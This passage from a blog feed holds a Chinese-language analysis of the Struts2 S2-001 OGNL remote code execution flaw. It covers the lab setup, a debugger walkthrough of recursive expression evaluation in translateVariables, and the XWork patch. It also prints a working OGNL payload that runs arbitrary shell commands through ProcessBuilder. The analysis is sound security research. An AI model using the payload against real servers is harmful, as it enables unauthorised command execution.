      &lt;p&gt;一些自己写的文章。&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://chybeta.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
      <category term="pwn" scheme="http://chybeta.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【struts2 命令/代码执行漏洞分析系列】S2-001</title>
    <link href="http://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/"/>
    <id>http://chybeta.github.io/2018/02/06/【struts2-命令-代码执行漏洞分析系列】S2-001/</id>
    <published>2018-02-06T03:06:46.000Z</published>
    <updated>2018-02-10T00:52:54.811Z</updated>
    
    <content type="html"><![CDATA[<p>首发于：<a href="https://xianzhi.aliyun.com/forum/topic/2044" target="_blank" rel="external">阿里先知安全社区：【struts2 命令/代码执行漏洞分析系列】S2-001</a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近学习java安全，在分析s2-001的时候发现了一些问题和心得。一方面网上关于s2-001的漏洞分析很少，基本上都是poc+利用而已，另一方面在调试过程中感觉apache官方通告有不准确的地方，这点见后面的<code>一点说明</code>部分，有不准确的地方望各位师傅指出，谢谢。<br><a id="more"></a></p>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p>漏洞信息页面： <a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
<p>漏洞成因官方概述：Remote code exploit on form validation error</p>
<p>漏洞影响：     </p>
<p>WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8 </p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/27.png?raw=true" alt=""></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>源码结构：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/25.png?raw=true" alt=""></p>
<p>几个主要文件（待会用到）：<br>index.jsp<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">  &lt;title&gt;用户登录&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;h1&gt;用户登录&lt;/h1&gt;</div><div class="line">&lt;s:form action="login"&gt;</div><div class="line">  &lt;s:textfield name="username" label="username" /&gt;</div><div class="line">  &lt;s:textfield name="password" label="password" /&gt;</div><div class="line">  &lt;s:submit&gt;&lt;/s:submit&gt;</div><div class="line">&lt;/s:form&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>struts.xml:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></div><div class="line">        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</div><div class="line">        "http://struts.apache.org/dtds/struts-2.0.dtd"&gt;</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"s2-001"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"com.test.LoginAction"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>web.xml:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div><div class="line">&lt;web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://xmlns.jcp.org/xml/ns/javaee" xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd" id="WebApp_ID" version="3.1"&gt;</div><div class="line"></div><div class="line"></div><div class="line">    &lt;filter&gt;</div><div class="line">        &lt;filter-name&gt;struts2&lt;/filter-name&gt;</div><div class="line">        &lt;filter-class&gt;org.apache.struts2.dispatcher.FilterDispatcher&lt;/filter-class&gt;</div><div class="line">    &lt;/filter&gt;</div><div class="line"></div><div class="line">    &lt;filter-mapping&gt;</div><div class="line">        &lt;filter-name&gt;struts2&lt;/filter-name&gt;</div><div class="line">        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</div><div class="line">    &lt;/filter-mapping&gt;</div><div class="line"></div><div class="line">    &lt;welcome-file-list&gt;</div><div class="line">        &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;</div><div class="line">    &lt;/welcome-file-list&gt;</div><div class="line"></div><div class="line">&lt;/web-app&gt;</div></pre></td></tr></table></figure></p>
<p>完整源码见附件。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>最简单poc：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;1+1&#125;</div></pre></td></tr></table></figure></p>
<p>任意命令执行:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</div></pre></td></tr></table></figure></p>
<p>将<code>new java.lang.String[]{&quot;pwd&quot;})</code>中的<code>pwd</code>替换为对应的命令，即可执行。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/26.png?raw=true" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在经过tomcat容器的处理后，http请求会到达struts2，从这里开始调试吧。</p>
<p>在 /com/opensymphony/xwork2/interceptor/ParametersInterceptor.java:158 接受我们输入的参数值，之后会调用对应的set方法(这个省略)：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">    ValueStack stack = ac.getValueStack();</div><div class="line">    setParameters(action, stack, parameters);</div><div class="line">&#125; <span class="keyword">finally</span> &#123;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/1.png?raw=true" alt=""></p>
<p>继续执行，执行完interceptor部分，也即对<code>return invocation.invoke();</code>进行step over，到达/com/opensymphony/xwork2/DefaultActionInvocation.java:252</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/2.png?raw=true" alt=""></p>
<p>跟进<code>executeResult()</code>，到达 /com/opensymphony/xwork2/DefaultActionInvocation.java:343</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/3.png?raw=true" alt=""></p>
<p>跟进<code>result.execute(this)</code>，到达 /org/apache/struts2/dispatcher/StrutsResultSupport.java:175：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/10.png?raw=true" alt=""></p>
<p>此后在<code>dispatcher.forward(request, response);</code>跟进，此处省略一些过程，相关调用栈如下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/11.png?raw=true" alt=""></p>
<p>进入 /org/apache/struts2/views/jsp/ComponentTagSupport.java:47，</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/12.png?raw=true" alt=""></p>
<p>这里会对jsp标签进行解析，但这时的标签并不包含我们的payload，我们可以在这里step over，直到解析到对应的标签：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/13.png?raw=true" alt=""></p>
<p>如上图，我们提交的password值为<code>%{1+1}</code>，因此着重关注对<code>&lt;s:textfield name=&quot;password&quot; label=&quot;password&quot; /&gt;</code>解析。回到<code>doStartTag</code>，执行完后会再次回到<code>index.jsp</code>，此时遇到了相应的闭合标签<code>/&gt;</code>，会跳转到<code>doEndTag</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">doEndTag</span><span class="params">()</span> <span class="keyword">throws</span> JspException </span>&#123;</div><div class="line">        component.end(pageContext.getOut(), getBody());</div><div class="line">        component = <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">return</span> EVAL_PAGE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟进<code>component.end()</code>，到达 /org/apache/struts2/components/UIBean.java:486：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/14.png?raw=true" alt=""></p>
<p>跟入<code>evaluateParams</code>后一直执行到如下图</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/4.png?raw=true" alt=""></p>
<p>由于开启了<code>altSyntax</code>，expr变为为<code>%{password}</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/15.png?raw=true" alt=""></p>
<p>跟入<code>addParameter(&quot;nameValue&quot;, findValue(expr, valueClazz));</code>中的<code>findValue</code>，来到 /org/apache/struts2/components/Component.java:318<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">findValue</span><span class="params">(String expr, Class toType)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (altSyntax() &amp;&amp; toType == String.class) &#123;</div><div class="line">        <span class="keyword">return</span> TextParseUtil.translateVariables(<span class="string">'%'</span>, expr, stack);</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>开启了<code>altSyntax</code>且<code>toType</code>为<code>class.java.lang.string</code>，跟入<code>TextParseUtil.translateVariables</code>，在/com/opensymphony/xwork2/util/TextParseUtil.java:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">translateVariables</span><span class="params">(<span class="keyword">char</span> open, String expression, ValueStack stack)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> translateVariables(open, expression, stack, String.class, <span class="keyword">null</span>).toString();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>继续跟入<code>translateVariables</code>，源码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">translateVariables</span><span class="params">(<span class="keyword">char</span> open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator)</span> </span>&#123;</div><div class="line">    <span class="comment">// deal with the "pure" expressions first!</span></div><div class="line">    <span class="comment">//expression = expression.trim();</span></div><div class="line">    Object result = expression;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</div><div class="line">        <span class="keyword">int</span> start = expression.indexOf(open + <span class="string">"&#123;"</span>);</div><div class="line">        <span class="keyword">int</span> length = expression.length();</div><div class="line">        <span class="keyword">int</span> x = start + <span class="number">2</span>;</div><div class="line">        <span class="keyword">int</span> end;</div><div class="line">        <span class="keyword">char</span> c;</div><div class="line">        <span class="keyword">int</span> count = <span class="number">1</span>;</div><div class="line">        <span class="keyword">while</span> (start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</div><div class="line">            c = expression.charAt(x++);</div><div class="line">            <span class="keyword">if</span> (c == <span class="string">'&#123;'</span>) &#123;</div><div class="line">                count++;</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">'&#125;'</span>) &#123;</div><div class="line">                count--;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        end = x - <span class="number">1</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ((start != -<span class="number">1</span>) &amp;&amp; (end != -<span class="number">1</span>) &amp;&amp; (count == <span class="number">0</span>)) &#123;</div><div class="line">            String var = expression.substring(start + <span class="number">2</span>, end);</div><div class="line"></div><div class="line">            Object o = stack.findValue(var, asType);</div><div class="line">            <span class="keyword">if</span> (evaluator != <span class="keyword">null</span>) &#123;</div><div class="line">            	o = evaluator.evaluate(o);</div><div class="line">            &#125;</div><div class="line">            </div><div class="line"></div><div class="line">            String left = expression.substring(<span class="number">0</span>, start);</div><div class="line">            String right = expression.substring(end + <span class="number">1</span>);</div><div class="line">            <span class="keyword">if</span> (o != <span class="keyword">null</span>) &#123;</div><div class="line">                <span class="keyword">if</span> (TextUtils.stringSet(left)) &#123;</div><div class="line">                    result = left + o;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    result = o;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</div><div class="line">                    result = result + right;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                expression = left + o + right;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="comment">// the variable doesn't exist, so don't display anything</span></div><div class="line">                result = left + right;</div><div class="line">                expression = left + right;</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>此时<code>expression</code>为<code>%{password}</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/16.png?raw=true" alt=""></p>
<p>经过while循环，确定start和end定位后，此时<code>var</code>为<code>password</code>，到达：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/19.png?raw=true" alt=""></p>
<p><code>stack.findValue(var, asType);</code>会返回password的值<code>%{1+1}</code>，这个就是我们传入的payload：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/20.png?raw=true" alt=""></p>
<p>此后<code>o</code>为<code>%{1+1}</code>，再对<code>o</code>进行了一番处理后，payload经过<code>result</code>变量，最终成为<code>expression</code>的值：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/21.png?raw=true" alt=""></p>
<p>在完成后，进入下一个循环：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/22.png?raw=true" alt=""></p>
<p>并且在<code>Object o = stack.findValue(var, asType);</code>中完成了对payload的执行</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/24.png?raw=true" alt=""></p>
<p>因此究其原因，在于在<code>translateVariables</code>中，递归解析了表达式，在处理完<code>%{password}</code>后将<code>password</code>的值直接取出并继续在<code>while</code>循环中解析，若用户输入的password是恶意的ognl表达式，比如<code>%{1+1}</code>，则得以解析执行。</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>XWork 2.0.4中，改变了ognl表达式的解析方法从而不会产生递归解析，用户的输入也不会再解析执行。</p>
<p>对应源码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">translateVariables</span><span class="params">(<span class="keyword">char</span> open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator, <span class="keyword">int</span> maxLoopCount)</span> </span>&#123;</div><div class="line">    <span class="comment">// deal with the "pure" expressions first!</span></div><div class="line">    <span class="comment">//expression = expression.trim();</span></div><div class="line">    Object result = expression;</div><div class="line">    <span class="keyword">int</span> loopCount = <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> pos = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</div><div class="line">        </div><div class="line">        <span class="keyword">int</span> start = expression.indexOf(open + <span class="string">"&#123;"</span>, pos);</div><div class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span>) &#123;</div><div class="line">            pos = <span class="number">0</span>;</div><div class="line">            loopCount++;</div><div class="line">            start = expression.indexOf(open + <span class="string">"&#123;"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (loopCount &gt; maxLoopCount) &#123;</div><div class="line">            <span class="comment">// translateVariables prevent infinite loop / expression recursive evaluation</span></div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> length = expression.length();</div><div class="line">        <span class="keyword">int</span> x = start + <span class="number">2</span>;</div><div class="line">        <span class="keyword">int</span> end;</div><div class="line">        <span class="keyword">char</span> c;</div><div class="line">        <span class="keyword">int</span> count = <span class="number">1</span>;</div><div class="line">        <span class="keyword">while</span> (start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</div><div class="line">            c = expression.charAt(x++);</div><div class="line">            <span class="keyword">if</span> (c == <span class="string">'&#123;'</span>) &#123;</div><div class="line">                count++;</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">'&#125;'</span>) &#123;</div><div class="line">                count--;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        end = x - <span class="number">1</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ((start != -<span class="number">1</span>) &amp;&amp; (end != -<span class="number">1</span>) &amp;&amp; (count == <span class="number">0</span>)) &#123;</div><div class="line">            String var = expression.substring(start + <span class="number">2</span>, end);</div><div class="line"></div><div class="line">            Object o = stack.findValue(var, asType);</div><div class="line">            <span class="keyword">if</span> (evaluator != <span class="keyword">null</span>) &#123;</div><div class="line">            	o = evaluator.evaluate(o);</div><div class="line">            &#125;</div><div class="line">            </div><div class="line"></div><div class="line">            String left = expression.substring(<span class="number">0</span>, start);</div><div class="line">            String right = expression.substring(end + <span class="number">1</span>);</div><div class="line">            String middle = <span class="keyword">null</span>;</div><div class="line">            <span class="keyword">if</span> (o != <span class="keyword">null</span>) &#123;</div><div class="line">                middle = o.toString();</div><div class="line">                <span class="keyword">if</span> (!TextUtils.stringSet(left)) &#123;</div><div class="line">                    result = o;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    result = left + middle;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</div><div class="line">                    result = result + right;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                expression = left + middle + right;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="comment">// the variable doesn't exist, so don't display anything</span></div><div class="line">                result = left + right;</div><div class="line">                expression = left + right;</div><div class="line">            &#125;</div><div class="line">            pos = (left != <span class="keyword">null</span> &amp;&amp; left.length() &gt; <span class="number">0</span> ? left.length() - <span class="number">1</span>: <span class="number">0</span>) +</div><div class="line">                  (middle != <span class="keyword">null</span> &amp;&amp; middle.length() &gt; <span class="number">0</span> ? middle.length() - <span class="number">1</span>: <span class="number">0</span>) +</div><div class="line">                  <span class="number">1</span>;</div><div class="line">            pos = Math.max(pos, <span class="number">1</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>当解析完一层表达式后，如图，此时<code>loopCount &gt; maxLoopCount</code>，从而执行break，不再继续解析<code>%{1+1}</code>:</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/32.png?raw=true" alt=""></p>
<p>diff的结果如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/33.png?raw=true" alt=""><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/34.png?raw=true" alt=""></p>
<h1 id="一个说明"><a href="#一个说明" class="headerlink" title="一个说明"></a>一个说明</h1><p>回到漏洞信息和开头环境搭建部分，漏洞信息中的图有画上了几个红圈。基于此问一个问题：表单验证错误是在哪里触发的？</p>
<p>查阅apache2官方文档(<a href="https://struts.apache.org/core-developers/validation.html)提到" target="_blank" rel="external">https://struts.apache.org/core-developers/validation.html)提到</a></p>
<p>就本次测试源码而言，并没有相应的<code>validation.xml</code>或其他validation方法。为更直观起见，我们修改<code>LoginAction.java</code>源码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</div><div class="line">    <span class="keyword">this</span>.password = <span class="string">"%&#123;1+1&#125;"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</div><div class="line">    <span class="keyword">this</span>.username = <span class="string">"chybeta"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    <span class="keyword">if</span> (username.equals(<span class="string">"chybeta"</span>) ) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">"error"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">"success"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>当submit时，会执行相应的set方法，直接设置username和password分别为<code>chybeta</code>与<code>%{1+1}</code>。修改后的源码中的<code>execute</code>方法中若<code>username</code>为<code>chybeta</code>则返回<code>error</code>，根据struts.xml配置文件，当返回<code>error</code>时，会返回<code>index.jsp</code>，即这里不算存在逻辑上的验证错误，因为username被硬编码为<code>chybeta</code>了，<code>username.equals(&quot;chybeta&quot;)</code>恒成立。</p>
<p>所以这里没有涉及到我们传入的参数，不存在表单验证失败，也不存在逻辑上的验证失败。执行poc如下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/30.gif?raw=true" alt=""></p>
<p>所以可以说表单验证错误并不是该漏洞的产生的原因，但表单验证错误是这个漏洞出现的场景之一。在struts2框架中，配置了Validation，倘若验证出错会往往会原样返回用户输入的值而且不会跳转到新的页面，而在最后解析页面时区解析了用户输入的值，从而执行payload。在实际场景中，比如登陆等处，往往会配置了Validation，比如限制用户名长度，数字的范围等等，从而成为了该漏洞的高发区。</p>
<p>以struts2的showcase为例：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180207/32.gif?raw=true" alt=""></p>
<p>在本测试环境的源码中，没有表单验证，但同样把用户的输入留在了页面里，从而在解析的时候执行了。</p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-001</a></li>
<li><a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-001" target="_blank" rel="external">https://github.com/vulhub/vulhub/tree/master/struts2/s2-001</a></li>
<li><a href="http://www.freebuf.com/column/156344.html" target="_blank" rel="external">http://www.freebuf.com/column/156344.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首发于：&lt;a href=&quot;https://xianzhi.aliyun.com/forum/topic/2044&quot;&gt;阿里先知安全社区：【struts2 命令/代码执行漏洞分析系列】S2-001&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近学习java安全，在分析s2-001的时候发现了一些问题和心得。一方面网上关于s2-001的漏洞分析很少，基本上都是poc+利用而已，另一方面在调试过程中感觉apache官方通告有不准确的地方，这点见后面的&lt;code&gt;一点说明&lt;/code&gt;部分，有不准确的地方望各位师傅指出，谢谢。&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
